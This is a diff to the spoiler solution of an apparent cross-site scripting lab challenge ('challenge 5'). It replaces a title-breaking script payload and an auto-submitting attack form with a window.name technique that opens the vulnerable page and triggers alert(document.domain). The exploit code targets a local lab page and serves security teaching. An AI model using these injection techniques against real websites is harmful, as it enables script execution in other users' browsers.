@@ -5,21 +5,18 @@ Solution and further references for *challenge 5*.
  <summary>Spoiler: Solution for challenge 5</summary>
 
 **Payload**:
-Due to the limitation regarding the character set, one could for instance use `window.name` (= `name` on window scope.) to pass the required `document.domain` to the vulnerable code snippet. 
+Due to the limitation regarding the character set, one could for instance use `window.name` to pass the required `document.domain` to the vulnerable code snippet. 
 
-```html
-</title><script>alert(document.domain)</script>
-```
+Thus, to exploit the vulnerability, one needs to set `window.name` to `alert(document.domain)` and then browse to `challenge5.php?q=name`. 
 
 **Exploit**:
 ```html
-<html>
+<!DOCTYPE html>
+<html lang="en">
   <body>
-    <form action="http://127.0.0.1/challenge2.php" method="POST" id="attackForm">
-      <input type="hidden" name="q" value="&lt;&#47;title&gt;&lt;script&gt;alert&#40;document&#46;domain&#41;&lt;&#47;script&gt;" />
-      <input type="submit" value="Submit request" />
-    </form>
-  <script>attackForm.submit()</script>
+    <script>
+      open("challenge5.php?q=name", "alert(document.domain)")
+    </script>
   </body>
 </html>
 ```
